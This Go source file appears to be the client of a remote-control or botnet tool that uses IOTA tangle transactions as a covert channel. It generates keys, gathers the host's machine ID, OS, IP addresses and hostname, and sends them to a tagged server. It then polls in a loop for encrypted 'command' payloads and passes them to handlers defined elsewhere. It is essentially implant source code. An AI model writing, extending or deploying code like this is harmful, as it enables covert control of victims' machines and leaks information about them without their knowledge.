package main

import (
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"encoding/json"
	"encoding/pem"
	"fmt"
	"net"
	"os"
	"runtime"
	"time"

	"github.com/denisbrodbeck/machineid"
	"github.com/iotaledger/iota.go/converter"
	"github.com/thanhpk/randstr"
)

const srvPubKey = `-----BEGIN PUBLIC KEY-----
MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAt7pliq93QQmOVXUC4iMh
BUsr0CRqBkUJSdyGhkvPTDxZoO9cvtitBb02VjqpOI7M2A96GRMvp/pBzDdio9sE
l6XIA8IUfxQdBDGRxEs85D/UEotOVOnAKYwrbyUf4dyoUoWKGU7mNuYkDf7B4ibk
8ZeY4bP8QtqkQdRG2fFCBuCFWhoRds1pXZUAwpkCzww6vNxjKKfTHXOzrkB3W09E
IqmR5roVYlu5qKFfv+yPR2fSCrto5aAEGuPvMjRju4UY64/ulg9cqbSublWPhWAC
h6aqMn0towQGUYT4Kxm6uOg8QlMFLpaQ7V/lYnvrFRVSONWTT4kfp+i8uY7pzmq/
v2Jpl8aohUAp8QOz+Reu21lnyWq5BGole2qwAFLl7x854ZZTeXs8UM7Q42pU/K5m
NZySGCVFRgNLgbBtS9XLgICdXbcG/N7f3MBoRKr0XfPTjUdjgzJO0GghGmQY38c+
dqEvY2aDwswyI5HRyrnvcHVtG8OI+YEn6xWvr4T40O8o/7YXT1rQq6A/XcZQWacG
giJ/TDQKOeQpVUspovllQ24blU5No6kwpGZHgFn2mM7C4+GPGaoMAAVaLSTF7Rr3
h3sFDUp9JqPTFDbovmAsNvWnMepfTep9VpUfJw+n1z1Q5islLNpR9axKY8XET277
nVuenllgPv8uyQLgwaKRjY8CAwEAAQ==
-----END PUBLIC KEY-----`

var me Machine
var mytag string
var recvPayload []Payload

func getMachineInfo() (m Machine) {

	id, err := machineid.ID()
	addrs, err := net.InterfaceAddrs()

	m.UUID = id
	m.OS = runtime.GOOS

	for _, v := range addrs {
		m.IPs = append(m.IPs, v.String())
	}

	m.Hostname, err = os.Hostname()
	m.PublicKey = cliPublicKey
	m.LastSeen = time.Now().Unix()

	if err != nil {
		panic(err)
	}

	return m
}

func genKey() (pri string, pub string) {

	reader := rand.Reader

	prikey, err := rsa.GenerateKey(reader, 4096)

	if err != nil {
		panic(err)
	}

	pubkey := &prikey.PublicKey

	derStream := x509.MarshalPKCS1PrivateKey(prikey)
	priblock := &pem.Block{
		Type:  "RSA PRIVATE KEY",
		Bytes: derStream,
	}

	pri = string(pem.EncodeToMemory(priblock))

	derPkix := x509.MarshalPKCS1PublicKey(pubkey)

	if err != nil {
		panic(err)
	}

	pubblock := &pem.Block{
		Type:  "PUBLIC KEY",
		Bytes: derPkix,
	}

	pub = string(pem.EncodeToMemory(pubblock))

	return pri, pub
}
func updateRecvPayload(rawMsg []string) {

	for _, tx := range rawMsg {

		p := Payload{}

		iota := connPool.GetOne()
		txobj, _ := iota.GetTransactionObjects(tx)

		rawTy := txobj[0].SignatureMessageFragment
		ty := processRawTrytes(rawTy)

		rawJSON, err := converter.TrytesToASCII(ty)

		err = json.Unmarshal([]byte(rawJSON), &p)

		if err != nil {
			return
		}

		recvPayload = append(recvPayload, p)
	}
}

func next() {

	srvPublicKey = srvPubKey
	cliPriateKey, cliPublicKey = genKey()

	me = getMachineInfo()
	mytag = randstr.String(27, "9ABCDEFGHIJKLMNOPQRSTUVWXYZ")
	me.MyTag = mytag

	fmt.Println("mytag:", mytag)

	hello := HelloData{
		Info: me,
		OK:   false,
	}

	bRawHelloJSON, _ := json.Marshal(hello)
	rawHelloJSON, _ := MarshallPayload(string(bRawHelloJSON), cliPublicKey, 0, 0)

	SendPayload(rawHelloJSON, srvTag)

	listen()

}

func listen() {

	var preResult []string

	for {

		result := getAllTxByTags(mytag)

		diff := getStringElementThatOnlyInA(result, preResult)

		if len(diff) > 0 {

			updateRecvPayload(result)
			nx, ps := getDonePayload(recvPayload)
			recvPayload = nx

			for _, firstv := range ps {

				deJSON := ""

				for _, v := range firstv {
					de := v.EncryptData
					deJSON += de
				}

				if firstv[0].SentTime < lastTime {
					continue
				}

				fmt.Println(deJSON)

				if firstv[0].ReqType == 0 {

					switch firstv[0].DataType {
					case 0: //Hello
						go runHelloViaJSON([]byte(deJSON))
					case 1: //command
						go runCommandViaJSON([]byte(deJSON))
					}
				}
			}

		}

		preResult = result

		time.Sleep(200 * time.Millisecond)

	}
}
